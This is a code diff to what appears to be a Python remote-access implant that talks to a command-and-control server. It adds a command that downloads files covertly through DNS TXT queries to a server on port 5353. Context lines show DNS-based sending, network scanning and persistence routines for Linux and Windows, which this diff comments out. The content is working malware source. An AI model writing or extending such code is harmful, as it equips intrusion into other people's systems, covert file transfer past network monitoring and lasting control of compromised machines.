@@ -26,6 +26,66 @@ RestartSec=3
 WantedBy=default.target
 """
 
+
+''' DNS RECEIVE '''
+
+
+def get_chunk(domain, server, port) -> bytes:
+    # Create a UDP socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(5)
+
+    # DNS query header
+    request_id = 1234
+    flags = 0x0100
+    qdcount = 1
+    header = struct.pack('!HHHHHH', request_id, flags, qdcount, 0, 0, 0)
+
+    # DNS question section
+    question = b''
+    domain_parts = domain.split('.')
+    for part in domain_parts:
+        length = len(part)
+        question += struct.pack('!B{}s'.format(length), length, part.encode())
+    question += b'\x00'
+    question_type = 16 # TXT
+    question_class = 1
+    question += struct.pack('!HH', question_type, question_class)
+
+    # Construct the complete DNS request packet
+    request = header + question
+
+    try:
+        # Send DNS request
+        sock.sendto(request, (server, port))
+
+        # Receive DNS response
+        data, addr = sock.recvfrom(1024)
+        _, data = data.split(b'get', 1)
+
+        return data[18:]
+
+    except socket.timeout:
+        print("DNS request timed out.")
+
+    finally:
+        # Close the socket
+        sock.close()
+
+
+def dns_receive(dst_path) -> bool:
+    while True:
+        chunk = get_chunk("file.get", HOST, 5353)
+
+        if chunk == b"end":
+            break
+        else:
+            with open(dst_path, 'ab') as f:
+                f.write(chunk)
+
+    return True
+
+
 ''' NETWORK SCAN '''
 
 
@@ -212,7 +272,7 @@ def send_chunk(domain, server, port) -> str:
         length = len(part)
         question += struct.pack('!B{}s'.format(length), length, part.encode())
     question += b'\x00'
-    question_type = 1
+    question_type = 1 # A
     question_class = 1
     question += struct.pack('!HH', question_type, question_class)
 
@@ -434,6 +494,11 @@ def process_instructions(ss: ssl.SSLSocket, persistence: dict):
                         ss.send(b"ok")
                     else:
                         ss.send(b"ko")
+                case b"receive":
+                    if dns_receive(buffer.split(b" ")[1]):
+                        ss.send(b"ok")
+                    else:
+                        ss.send(b"ko")
                 case b"scan":
                     output = start_network_scan(buffer.split(b" ")[1].decode())
                     ss.send(output.encode())
@@ -457,12 +522,12 @@ def main():
 
     # Persistence
     persistence = {}
-    print("Start persistence...")
-    if platform.system() == "Linux":
-        persistence_linux(persistence)
-    elif platform.system() == "Windows":
-        persistence_windows(persistence)
-    print("Finished persistence !")
+    #print("Start persistence...")
+    #if platform.system() == "Linux":
+    #    persistence_linux(persistence)
+    #elif platform.system() == "Windows":
+    #    persistence_windows(persistence)
+    #print("Finished persistence !")
 
     # Start secure connection with C2
     ss = init_connection()
